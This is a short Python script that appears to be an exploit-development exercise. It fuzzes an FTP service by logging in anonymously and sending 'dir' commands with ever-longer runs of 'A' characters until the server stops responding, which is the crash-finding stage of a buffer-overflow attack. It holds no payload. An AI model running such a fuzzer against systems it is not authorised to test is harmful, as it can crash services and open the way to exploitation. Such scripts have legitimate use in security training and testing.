import socket

def Fuzzing(bytes, IP, PORT):
    try:
        print("Fuzzing with %s bytes" %len(bytes))
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        connect = s.connect((IP, PORT))
        s.recv(1024)
        s.send(b'USER anonymous\r\n')
        s.recv(1024)
        s.send(b'PASSW anonymous@anon.org\r\n')
        s.recv(1024)
        s.send(b'dir ' + bytes + b'\r\n')
        s.close()
    except Exception as e:
        print(e)
        print("Program crash with %s bytes" %len(bytes))
        exit()

def main():
    IP  = input('Insert an ip address: ')
    PORT = int(input('Insert the port number: '))
    counter = 0
    while True:
        Fuzzing(b"A" * counter, IP, PORT)
        counter += 100
main()